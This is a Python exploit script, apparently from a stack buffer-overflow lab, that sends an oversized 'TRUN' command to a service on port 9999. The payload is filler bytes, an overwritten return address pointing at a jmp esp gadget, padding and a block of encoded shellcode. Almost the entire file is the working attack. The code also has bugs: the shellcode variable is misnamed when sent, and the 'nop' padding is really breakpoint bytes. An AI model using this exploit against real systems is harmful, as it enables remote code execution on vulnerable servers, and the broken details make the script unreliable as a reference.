#Client Socket Program - fuzzer (TRUN)

import socket 

host = "192.168.194.172"
port = 9999
length = 1981 + 25 #server crashes at 2006 = 2008 + 4 - 6

buf =  b""
buf += b"\xda\xc5\xd9\x74\x24\xf4\x5f\x57\x59\x49\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x43\x37"
buf += b"\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41"
buf += b"\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
buf += b"\x50\x38\x41\x42\x75\x4a\x49\x49\x6c\x7a\x48\x4f\x72"
buf += b"\x75\x50\x33\x30\x63\x30\x73\x50\x6f\x79\x7a\x45\x36"
buf += b"\x51\x6f\x30\x45\x34\x6e\x6b\x52\x70\x30\x30\x6c\x4b"
buf += b"\x32\x72\x64\x4c\x6c\x4b\x71\x42\x34\x54\x6c\x4b\x52"
buf += b"\x52\x57\x58\x74\x4f\x6f\x47\x51\x5a\x37\x56\x66\x51"
buf += b"\x39\x6f\x6e\x4c\x77\x4c\x63\x51\x73\x4c\x76\x62\x36"
buf += b"\x4c\x67\x50\x4b\x71\x48\x4f\x74\x4d\x75\x51\x49\x57"
buf += b"\x69\x72\x79\x62\x30\x52\x56\x37\x6c\x4b\x66\x32\x72"
buf += b"\x30\x6c\x4b\x30\x4a\x45\x6c\x6e\x6b\x42\x6c\x72\x31"
buf += b"\x71\x68\x38\x63\x47\x38\x76\x61\x4a\x71\x42\x71\x4c"
buf += b"\x4b\x61\x49\x45\x70\x66\x61\x49\x43\x4e\x6b\x52\x69"
buf += b"\x57\x68\x79\x73\x35\x6a\x30\x49\x4e\x6b\x55\x64\x6e"
buf += b"\x6b\x75\x51\x6e\x36\x44\x71\x6b\x4f\x4e\x4c\x6f\x31"
buf += b"\x6a\x6f\x74\x4d\x66\x61\x59\x57\x66\x58\x6b\x50\x34"
buf += b"\x35\x68\x76\x73\x33\x61\x6d\x4b\x48\x57\x4b\x33\x4d"
buf += b"\x67\x54\x43\x45\x78\x64\x36\x38\x6c\x4b\x71\x48\x76"
buf += b"\x44\x77\x71\x78\x53\x65\x36\x4c\x4b\x44\x4c\x42\x6b"
buf += b"\x4e\x6b\x73\x68\x37\x6c\x35\x51\x5a\x73\x6e\x6b\x77"
buf += b"\x74\x4e\x6b\x63\x31\x38\x50\x6b\x39\x52\x64\x57\x54"
buf += b"\x46\x44\x63\x6b\x63\x6b\x50\x61\x70\x59\x72\x7a\x46"
buf += b"\x31\x79\x6f\x39\x70\x51\x4f\x73\x6f\x72\x7a\x6c\x4b"
buf += b"\x37\x62\x4a\x4b\x6c\x4d\x73\x6d\x53\x5a\x37\x71\x6c"
buf += b"\x4d\x6c\x45\x68\x32\x37\x70\x55\x50\x57\x70\x76\x30"
buf += b"\x55\x38\x45\x61\x6c\x4b\x70\x6f\x4c\x47\x39\x6f\x68"
buf += b"\x55\x6d\x6b\x6c\x30\x6d\x65\x6d\x72\x71\x46\x33\x58"
buf += b"\x4c\x66\x6f\x65\x4d\x6d\x4f\x6d\x6b\x4f\x6b\x65\x65"
buf += b"\x6c\x66\x66\x43\x4c\x35\x5a\x4d\x50\x4b\x4b\x4d\x30"
buf += b"\x63\x45\x55\x55\x6f\x4b\x43\x77\x45\x43\x72\x52\x50"
buf += b"\x6f\x33\x5a\x35\x50\x42\x73\x79\x6f\x48\x55\x65\x33"
buf += b"\x73\x51\x32\x4c\x52\x43\x44\x6e\x75\x35\x62\x58\x30"
buf += b"\x65\x53\x30\x41\x41"

EIP = b"\x63\x5c\xca\x76" # adr of jmp esp #"\x45\x44\x43\x42"  
nop = b"\xcc"*30

#for length in range(1, 3000, 30):
try:
  client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  # client_socketsettimeout(3)
  # set timeout on subsequent blocking methods (connect, recv) 
  # recv's operation is not comoplete within 3 seconds. an exceptions is raised. 
  client_socket.connect((host, port))
  msg = client_socket.recv(1024)
  print(msg.decode())

  bad_str = b"TRUN ." + b"A"*length + EIP + nop + buff + b"\r\n"

  client_socket.send(bad_str)
  msg = client_socket.recv(1024) #blocks if server crashes
  print(msg.decode())
  client_socket.close()
except:
  print("Server crashes at length: ", length)
  # break